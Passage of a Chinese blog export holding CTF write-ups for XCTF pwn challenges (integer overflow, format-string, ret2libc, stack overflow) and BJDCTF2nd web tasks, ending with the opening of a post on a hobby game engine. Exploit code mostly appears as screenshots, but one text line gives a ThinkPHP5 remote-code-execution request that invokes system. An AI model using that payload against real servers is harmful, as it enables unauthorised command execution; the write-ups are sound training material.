<h1 id="Pwn-100"><a href="#Pwn-100" class="headerlink" title="Pwn-100"></a>Pwn-100</h1><p>这道题花了很长时间，主要花时间在想用DynELF做，到最后也没有写出来，还是用LibcSearcher解了。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png" class="lazyload" title="nc"></a></p>
<p>链接看一下，直接有输入，一直输一直输，要很长才会输出一个bye～，ida看一下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png" data-fancybox="group" data-caption="ida" class="fancybox"><img alt="ida" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png" class="lazyload" title="ida"></a></p>
<p>主函数没东西，跟踪到40068E看一下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png" data-fancybox="group" data-caption="68e" class="fancybox"><img alt="68e" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png" class="lazyload" title="68e"></a></p>
<p>声明了一个v1，调用40063D，注意传参传了一个200，继续看</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png" data-fancybox="group" data-caption="63d" class="fancybox"><img alt="63d" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png" class="lazyload" title="63d"></a></p>
<p>一个执行200次的循环，循环体是一个只读入1个字节的read，显然这里存在溢出。</p>
<p>exp：</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png" class="lazyload" title="exp"></a></p>
<p>第16行为什么这样写，需要自己去调试出来。</p>
<p><em>LibcSearcher和Ropgadget真好用。</em></p>
<h1 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h1><p>有故事背景，还有多层的代码，感觉是个好玩的题，结果一看发现就是简单的栈溢出</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" class="lazyload" title="exp"></a></p>
<p>非常简单，看了官方wp发现这原来是一道盲打。emmm，果然是道好题。</p>
]]></content>
      <tags>
        <tag>CTF,PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF-Pwn新手区</title>
    <url>/2020/04/13/int-overflow/</url>
    <content><![CDATA[<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p>nc链接一下题目。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190617.png" data-fancybox="group" data-caption="连接" class="fancybox"><img alt="连接" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190617.png" class="lazyload" title="连接"></a></p>
<p>大概是先选择功能，再输入用户名，密码。一共有三次输入，这中间就可能存在漏洞。</p>
<p>拖进ida</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190414.png" data-fancybox="group" data-caption="ida" class="fancybox"><img alt="ida" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190414.png" class="lazyload" title="ida"></a></p>
<p>主函数中并没有明显的漏洞，跟踪到login中</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190436.png" data-fancybox="group" data-caption="login" class="fancybox"><img alt="login" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190436.png" class="lazyload" title="login"></a></p>
<p>login函数里也没有找到可能的漏洞，输入的密码储存进了buf，并传递给了check_passwd函数</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190446.png" data-fancybox="group" data-caption="check_passwd" class="fancybox"><img alt="check_passwd" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190446.png" class="lazyload" title="check_passwd"></a></p>
<p>在check_passwd函数里，变量v3声明为无符号整型，占8bit，即一个字节，用来储存s（刚才传入的buf）的长度。但是buf的长度是0x199，远大于v3的长度。8bit储存范围是0～255，由于无符号，超过255就会“循环”，256就与0相等。</p>
<p>line8执行了判断，要求v3的范围在3～8之间。但是我们使v3溢出，在259～264亦可。</p>
<p>测试一下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190715.png" data-fancybox="group" data-caption="测试" class="fancybox"><img alt="测试" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190715.png" class="lazyload" title="测试"></a></p>
<p>成功了，注意到在判断密码成功后，字符串会被拷贝进dest里，那么可以开始构造payload了。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190327.png" data-fancybox="group" data-caption="target" class="fancybox"><img alt="target" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190327.png" class="lazyload" title="target"></a></p>
<p>在左侧的函数列表中有一个what_is_this，执行后就能getflag。观察一下栈的情况</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190520.png" data-fancybox="group" data-caption="栈" class="fancybox"><img alt="栈" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190520.png" class="lazyload" title="栈"></a></p>
<p>所以payload，先’A’*0x14,填满dest和v3所占的空间，再’a’*4填满储存ebp的位置，然后就可以加上目标地址了。最后，要让payload的总长在259～264之间。</p>
<p>exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20191528.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20191528.png" class="lazyload" title="exp"></a></p>
<p>运行即得flag。</p>
<h1 id="Cgpwn2"><a href="#Cgpwn2" class="headerlink" title="Cgpwn2"></a>Cgpwn2</h1><p>nc连接一下题目</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.10.29.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.10.29.png" class="lazyload" title="nc"></a></p>
<p>有两次输入，拖进ida看一下main函数</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.11.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.11.png" class="lazyload" title="main"></a></p>
<p>建立了三个缓冲区，调用了hello函数，进hello函数看一下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.22.png" data-fancybox="group" data-caption="hello" class="fancybox"><img alt="hello" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.22.png" class="lazyload" title="hello"></a></p>
<p>有一段复杂的代码，暂时不知道是干什么的，下面是两次输入，第一次是对输入有限制的输入，第二次用的是危险的gets函数。</p>
<p>变量name</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.13.08.png" data-fancybox="group" data-caption="name" class="fancybox"><img alt="name" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.13.08.png" class="lazyload" title="name"></a></p>
<p>看函数列表</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.37.png" data-fancybox="group" data-caption="list" class="fancybox"><img alt="list" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.37.png" class="lazyload" title="list"></a></p>
<p>还有一个pwn函数，里面调用了system函数。</p>
<p>那么我们的思路就有了，把gets函数的返回地址覆盖为_system的地址，在输入名字的时候输入/bin/sh，让shellcode执行就可以了。</p>
<p>exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.14.49.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.14.49.png" class="lazyload" title="exp"></a></p>
<p>_shstr是shellcode的储存地址，p32(1)是调用_system时要覆盖的返回地址，随便写一个就可以。</p>
<p>运行即可Get Shell。</p>
<h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p>连接题目看一下题</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%889.25.06.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%889.25.06.png" class="lazyload" title="nc"></a></p>
<p>文本量巨大，能看出是个rpg游戏，开头有法师说会给予你帮助，你自己打不败恶龙，然后告诉了我们两个秘密。secret是一个数组，储存了看起来像地址的数据。暂时不知道有什么用。</p>
<p>拖进ida分析</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.54.09.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.54.09.png" class="lazyload" title="main"></a></p>
<p>在main函数可以看到v3被赋值给了v4，v3是malloc申请的一个8bit空间的地址，再根据下面的输出，可以推断出，v3就是secret。</p>
<p>再跟踪到sub_400D72</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.26.08.png" data-fancybox="group" data-caption="1" class="fancybox"><img alt="1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.26.08.png" class="lazyload" title="1"></a></p>
<p>注意到23行存在格式化字符串漏洞。暂时还不知道利用它可以干嘛。返回然后进入sub_400CA6，传入的参数a1就是secret，也就是main函数里的v3。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.27.37.png" data-fancybox="group" data-caption="2" class="fancybox"><img alt="2" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.27.37.png" class="lazyload" title="2"></a></p>
<p>在最后的if部分可以看到，使secret[0]和secret[1]两个地址指向的值相等就可以获得法师的帮助，v1在17行强制转换成了一个函数指针并执行指向的函数。</p>
<p>所以我们的攻击思路就是，利用格式化字符串漏洞把secret[0]值修改为85使if成立，然后输入shellcode就可以get shell了。</p>
<p>exp</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.25.17.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.25.17.png" class="lazyload" title="exp"></a></p>
<p>要覆盖的值的地址在payload发送前写入栈，然后利用漏洞修改这个地址的值。paylaod中的&#39;7&#39;是试验出的结果，前一次输入的地址被保存在了步长为7的位置。</p>
<p><em>本题要感谢<strong>不会修电脑</strong>师傅的指点</em></p>
<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>直接拖进IDA分析</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" class="lazyload" title="main"></a></p>
<p>没什么东西，去看vulnerable_function</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" data-fancybox="group" data-caption="vf" class="fancybox"><img alt="vf" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" class="lazyload" title="vf"></a></p>
<p>第6行调用了read读取了100bit，但是buf只有88bit，存在栈溢出漏洞。但是并没有system函数可以利用，而是给了libc，所以是ret2libc。我们要从libc中载入system和/bin/sh，就要先获得它们的got地址。</p>
<p><strong>攻击思路：</strong>先泄漏write函数（read函数亦可）的got地址，然后减去write函数在libc中的地址，就能得到offset（偏移），那么由于libc中的地址相对固定，就可以根据&#39;libc地址+offset=got地址&#39;算出system函数和/bin/sh的got地址。</p>
<p>有了这两个地址，就可以当普通的栈溢出做了。</p>
<p>完整exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%881.40.23.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%881.40.23.png" class="lazyload" title="exp"></a></p>
<p>需要注意的是，如果PIE保护开启，offset将是动态的，就不能通过计算一个函数的offset去推算其他函数。</p>
<p>此外，两次payload必须在同一次程序运行过程中完成，不能分成第一次运行获得地址，第二次运行执行栈溢出攻击。因为程序的每一次运行，外部函数在got表中的实际地址都是不同的，所以我们的第一个rop链中必须使程序返回到合适的位置，在上面的exp中，第一次write执行后返回到了main函数，以便可以执行第二个payload。</p>
<p><em>[<strong>此处是个人理解部分</strong>]</em>  在rop链中，希望调用的外部函数地址，可以是plt表中的地址，也可以是got表中的实际地址，因为plt地址指向的数据就是这个函数在got表的实际地址。</p>
<p><em>本题要感谢<strong>Thriumph</strong>师傅的指点</em></p>
<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p><em>这一题也是格式化字符串漏洞，但是比较简单，可以独立完成</em></p>
<p>直接ida看题</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%885.58.22.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%885.58.22.png" class="lazyload" title="main"></a></p>
<p>很直白，在23行存在格式化字符串漏洞，再看到下面的if条件，很明显是要我们利用漏洞修改pwnme的值为8.</p>
<p>看一下pwnme</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.25.png" data-fancybox="group" data-caption="pwnme" class="fancybox"><img alt="pwnme" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.25.png" class="lazyload" title="pwnme"></a></p>
<p>是全局变量，所以地址不变。</p>
<p>题目一共输入了两次，第一次输入在了buf缓冲区，猜测可能是要在这里输入目标地址。但是read限制读取10个字符，再看栈</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.10.png" data-fancybox="group" data-caption="栈" class="fancybox"><img alt="栈" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.10.png" class="lazyload" title="栈"></a></p>
<p>0x7E-10=0x75，正好在s变量前，所以不存在溢出，也无法利用格式化漏洞读取到。所以我们要在输入s中输入先输入地址，然后修改这个地址的值。</p>
<p>exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.20.14.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.20.14.png" class="lazyload" title="exp"></a></p>
<p>%10$n中的10是测试出来的offset。</p>
<p>32位的地址是32bit，也就是4个字节，经过测试，程序字符集可能是ascii或utf-8，所以4个字节就是4个字符。为了使pwnme的值为8，所以payload里多加4个a，这样最终一共输出8个字符，%10n就会把第10个位置的值赋值为8。</p>
<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>学Pwn七天，学到的东西没有很多，但是原理和小细节都弄清楚了，这些漏洞的高级运用方法还要在以后认真学习。</p>
]]></content>
      <tags>
        <tag>CTF,PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2nd</title>
    <url>/2020/04/08/BJDCTF2nd/</url>
    <content><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>BJDCTF2nd是北京工业大学的第二次新生赛。密码题比较基础，AK了，杂项解出了6题，都不难，Web解出两题，记录一下。</p>
<h1 id="FAKE-GOOGLE"><a href="#FAKE-GOOGLE" class="headerlink" title="FAKE GOOGLE"></a>FAKE GOOGLE</h1><p>拿到题目，界面如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.05.png" data-fancybox="group" data-caption="主页" class="fancybox"><img alt="主页" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.05.png" class="lazyload" title="主页"></a></p>
<p>随便输入搜索</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.30.png" data-fancybox="group" data-caption="搜索结果页面" class="fancybox"><img alt="搜索结果页面" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.30.png" class="lazyload" title="搜索结果页面"></a></p>
<p>直接看到回显，有可能存在xss，如果用了模板则可能有ssti</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.34.png" data-fancybox="group" data-caption="测试flask注入payload" class="fancybox"><img alt="测试flask注入payload" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.34.png" class="lazyload" title="测试flask注入payload"></a></p>
<p>payload测试，发现注入成功</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.43.png" data-fancybox="group" data-caption="结果" class="fancybox"><img alt="结果" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.43.png" class="lazyload" title="结果"></a></p>
<p>在目录中寻找flag.</p>
<p>Get flag.</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.59.11.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.59.11.png" class="lazyload" title="flag"></a></p>
<h1 id="OLD-HACKER"><a href="#OLD-HACKER" class="headerlink" title="OLD HACKER"></a>OLD HACKER</h1><p>打开题目</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.08.41.png" data-fancybox="group" data-caption="主页" class="fancybox"><img alt="主页" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.08.41.png" class="lazyload" title="主页"></a></p>
<p>主页上没有可交互的地方，乍一看无从下手</p>
<p>注意到中间提示ThinkPhp5，可能是有关tp5的漏洞考察</p>
<p>找到tp5曾经有过一个rce漏洞，用payload测试</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure></div>

<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.30.18.png" data-fancybox="group" data-caption="报错信息" class="fancybox"><img alt="报错信息" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.30.18.png" class="lazyload" title="报错信息"></a></p>
<p>根据信息发现版本5.023</p>
<p>用5.023的payload</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.45.17.png" data-fancybox="group" data-caption="payload" class="fancybox"><img alt="payload" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.45.17.png" class="lazyload" title="payload"></a></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-09%20%E4%B8%8B%E5%8D%884.07.14.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-09%20%E4%B8%8B%E5%8D%884.07.14.png" class="lazyload" title="flag"></a></p>
<p>最后调整命令get flag</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>在命令行上玩出花:InfantGameEngine</title>
    <url>/2020/04/05/InfantGameEngine/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大概在八年前，我第一次出现了想要做游戏的想法。认识了flash，unity，但是并没能走下去，因为教程完全看不懂，也不了解编程，但是这也是我第一次发现编程是必须要学的。</p>
<p>在初三，我第一次认真开始学习编程，选了C++，听说它是一个程序员必须要掌握的语言。在知道什么是变量，数组，函数以及一些基本的控制语句后，我就开始了和编译器交流之旅。</p>
<p>在编译器里写好逻辑，计算机就会执行，并在屏幕上显示出来。能显示就能做游戏，考虑到只能顺序执行，并且当时我并不知道多线程，卡牌游戏似乎最适合了。</p>
<p>参照炉石，我一共写过两个卡牌游戏，从第一个到第二个，由于上学的缘故，这中间进步缓慢，但我也在这中间积累了一些自己封装好的函数，我写的第二个，从17年写到19年，里面有相当多的卡牌。为了实现一些卡牌效果，我会在语文课，自习课上用笔和纸写算法，那大概是我学计算机最快乐的时候。</p>
